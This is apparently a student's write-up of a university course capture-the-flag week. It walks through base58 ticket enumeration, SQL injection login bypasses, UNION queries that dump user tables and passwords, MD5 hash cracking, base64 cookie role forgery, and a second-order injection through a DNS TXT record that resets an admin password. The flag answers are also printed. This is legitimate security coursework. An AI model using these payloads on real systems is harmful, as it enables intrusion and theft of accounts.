---
title: "Course CTF: Week 4"
date: 2020-06-22T21:20:50+10:00

categories: ["Course CTF"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# Support

Site: support.-QBSITE-  
Solution File: ![support-base58enum.py](./support-base58enum.py)

When creating a new ticket, the slug generated is a base58 encoded string of `userid:noteid`.  
Bruteforce the userids to find a matching `<user>:1`, then enumerate horizontally.

`base54("1:1")` -> `HY2U` - first ticket test!  
`base54("8:1")` --> `KtPz` - ok it seems to be working  
`base54("274:1")` --> `6fbRN72` - It's trivial. You submit a ticket and there's your ticket  
`base54("1125:1")` --> `RVnSH2uN` - i want a credit card  
`base54("1125:2")` --> `RVnSH2uP` - why is my balance so low  
`base54("1125:3")` --> `RVnSH2uQ` - international transaction fee is stupid  
`base54("1125:4")` --> `RVnSH2uR` - COMP6443{PATIENCE_IS_KEY.ejUyMDY2Nzc=.F+oVFEZOU7/FMxzzZsVTpA==}  
`base54("1730:1")` --> `RWTivKdi` - lolol  
`base54("1780:1")` --> `RWTrLG3S` - z@in was h3r3  
`base54("9447:1")` --> `VVBWU75i` - COMP6443{H0W_D1D_U_F1GURE_OUT_BA5358.ejUyMDY2Nzc=.xqUEuSt98WYP81oyh/uDdw==}  

> `COMP6443{PATIENCE_IS_KEY.ejUyMDY2Nzc=.F+oVFEZOU7/FMxzzZsVTpA==}`  
> `COMP6443{H0W_D1D_U_F1GURE_OUT_BA5358.ejUyMDY2Nzc=.xqUEuSt98WYP81oyh/uDdw==}`

# Pay Portal

Site: pay-portal.-QBSITE-

Unsanitised SQL ... as with most SQLi, so nothing fancy.

```
" OR 1=1#
```

> `COMP6443{SQLiIsPowerful}`

# Bigapp

Site: bigapp.-QBSITE-

When we break the statement, we get a verbose output:

> Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' OR pname LIKE '%`PAYLOAD'`%') AND bu IS NOT NULL) ORDER BY ' at line 1

This helps us to identify what we need to inject

**Table Names**  
`a')) UNION SELECT table_schema, table_name, 1, 1, 1, 1 FROM information_schema.tables -- .`

```
# Results
isodb_bigapp_z5206677_services_quoccabank_com_v2.bproducts
isodb_bigapp_z5206677_services_quoccabank_com_v2.users
```

**Table: bproducts**  
`a')) UNION SELECT COLUMN_NAME,2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'bproducts' -- .`

Results: `id`, `pname`, `category`, `code`, `bu`, `owner`


**Table: users**  
`a')) UNION SELECT COLUMN_NAME,2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' -- .`

Results: `id`, `fname`, `lname`, `type`, `userid`, `email`, `mobile`, `city`, `state`, `postcode`, `password`

**SQLmap**  
Not allowed, but we can do this `sqlmap -u https://bigapp.-QBSITE-/api/v1/bproducts?q= -proxy http://localhost:8080 --cookie=login-cookie=MTIzQDEyMzp1c2Vy`

## UNION

> Make the banking product list return more than it should.

`a') UNION SELECT email, userid, password, type, fname, lname from users -- .`

> `COMP6443{INJECTION_UNION_CHALLENGE.ejUyMDY2Nzc=.t4JErZCIKV6nqi732y/Qjw==}`

## Order

> Sort the banking products.

`a')) UNION SELECT * from bproducts ORDER BY bu -- .`

> `COMP6443{USE_BY_ORDER.ejUyMDY2Nzc=.R7WMiJHDrwCDXZIPHEtBEQ==}`

## Login Admin

> Login to admin using its actual password without online brute-forcing.

First, dump the user data

`a')) UNION SELECT email, userid, password, type, fname, lname from users -- .`

For the `admin@-QBSITE-`, the password is`0e7517141fb53f21ee439b355b5a1d0a` which we can deduce as an MD5 hash!

`md5decrypt("0e7517141fb53f21ee439b355b5a1d0a")` -> `Admin@123`

> `COMP6443{LOGIN_USING_ADMIN_CREDS.ejUyMDY2Nzc=.SrxYWWiv4f5I3+WscPcckQ==}`

## Get create error bypass

> Create duplicate user with existing user's email.

Site: bigapp.-QBSITE-/create.html

Inject the query `aaaaaa' or 1; -- a` into the `email` field of the POST request

> `COMP6443{CREATE_BY_WITH_BYPASS.ejUyMDY2Nzc=.eNi7YTlfNLoo7DmlsZj+Hw==}`

## Get by with bypass

> Become admin without logging into admin.

Our authentication data is stored in the `login-cookie` cookie.

`b64decode("dXNlckBhY2NvdW50OnVzZXI=")` -> `user@account:user`  

We can change the `user` role, to `admin`.  
`b64encode("user@account:admin")` -> `dXNlckBhY2NvdW50OmFkbWlu`

```
HTTP/1.1 200 OK
Content-Length: 157
Content-Type: application/json
Date: Wed, 24 Jun 2020 13:50:38 GMT
Server: gunicorn/19.9.0
X-Ctfproxy-Trace-Context: a9276106-822a-4da2-b126-720ef57ec7a5
Connection: close

[{"bu":"N/A","category":"Session","code":66666,"id":0,"owner":"N/A","pname":"YOUR_FLAg=COMP6443{GET_BY_WITH_BYPASS.ejUyMDY2Nzc=.cy2yX6JBwhBeLuw4iVQ7/w==}"}]
```

> `COMP6443{GET_BY_WITH_BYPASS.ejUyMDY2Nzc=.cy2yX6JBwhBeLuw4iVQ7/w==}`

## No login needed

Site: bigapp.-QBSITE-/login.html

<!-- Login. -->

Generic SQLi

```
' OR 1=1#
```

> `COMP6443{WHAT_IS_LOGIN.ejUyMDY2Nzc=.maxO5pg3wNrte8L+nfih7A==} - `


# signin.-QBSITE-

Site: signin.-QBSITE-

Here we are presented with a login site. To login we need a `@-QBSITE-` email, and a password.  
We don't know the password, and can only get it from performing a password reset.

When performing a usual password reset under your own account, we are greeted with the time and IP address (originator) of our last reset, as well as a reverse DNS search of our reset IP...  
_Interesting..._.

The site uses qdns.-QBSITE- to manage the reverse IP lookup.  

In the QDNS site, there is a lookup and a register service.  
Lookup -> Find the domain name for a given IP  
Register -> Set a domain name for a given IP

After some investigation, it turns out that _when you perform a password reset_, the reverse DNS lookup of your reset IP is requested, and various DNS records are fetched (A, NS, MX, TXT, ...). Outbound requests aren't blocked, so actual DNS records are returned.

We can make a reasonable assumption from this information - that when we do a password reset, a database update query is performed - so perhaps this functionality is vulnerable.  

When registering (with QDNS) my IP address to some arbitrary SQL magic strings, it seems that the `'` character is stripped from our input. No variation of the apostrophe character (that I tried) or multi-byte apostrophe character seemed to have worked.

However, when injecting a `\`, I did get a SQL error message during my password reset.  

```
Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;Error obtaining NS for \&#39;, last_reset=?, reset_actor=? where email=?&#39; at line 1
```

This looks promising.  
The server is likely performing some sort of MySQL UPDATE query and code routine like the following

```python3
lookupResult = lookup(domainName)
query = f"UPDATE table SET result='{lookupResult}', last_reset=?, reset_actor=? WHERE email=?"
executeSQL(query, last_reset, reset_actor, email)
```

When looking up `\`, we get an error message that ends with `\`.  
This causes the apostrophe pair to break and give us an SQL error.

As we can't insert the `'` to inject our own code, we need to do it another way.

_"If the place that takes user input doesn't seem to accept malicious input though, how else can you control/redirect/point it to something that does..."_

As the lookup queries several DNS records, we could potentially inject our SQLi payload as the value of a DNS record - namely the TXT record. This does, however, require you to have access to a registered (sub)domain - But hey! You can get these for free (i.e. a free website host, .tk, .eu.org)

We can point our IP to the domain name in QDNS, and create a TXT record which contains our SQLi (this time allowing us to use the apostrophe!).

We don't know, however, where the flag is stored. Is it a column? Is it in the same table? The same database? A file in the system???!??!  
_Too many questions, not enough confidence - Probably it's easier than we think._

Remembering back to the fact that we can only reset our own user account - perhaps we can reset the `admin@-QBSITE-` account.  

To do so, I made the assumption that the password was stored in plain-text in a field called `password` - Which I was right in assuming.

When crafting the payload, we need to keep the same number of parameterised queries, so that MySQL doesn't get angry at us. Since we are hardcoding the email, we need to place a parameterised query substitutor somewhere else - I opted to just whack all three queries into a random field. We then add the extra field (password) to update.

`', last_reset=CONCAT(?, ?, ?), password="password" WHERE email='admin@-QBSITE-' #-- a`

After another password reset for _my_ user, the SQL statement should have executed, which will give us access to `admin@-QBSITE-:password`

> `COMP6443{INJECT_EVERYTHING_INJECT_EVERYWHERE.ejUyMDY2Nzc=.0WV6+a18NnTd5FN1L67fHw==}`